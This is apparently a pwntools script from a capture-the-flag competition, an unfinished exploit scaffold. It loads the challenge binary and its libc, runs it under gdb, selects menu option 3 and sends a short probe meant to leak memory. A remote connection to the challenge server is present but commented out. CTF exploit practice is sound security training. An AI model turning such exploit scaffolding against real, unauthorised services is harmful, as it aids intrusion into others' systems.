#!/usr/bin/env python3

from pwn import *

exe = ELF("./capture_the_flaaaaaaaaaaaaag")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe

# p = remote("chall.polygl0ts.ch", 9003)

p = process("./capture_the_flaaaaaaaaaaaaag")
gdb.attach(p)

leak_payload = b"A"*4

p.recvuntil(b">")
p.sendline(b"3")
p.recvuntil(b">")
p.sendline(leak_payload)
p.interactive()
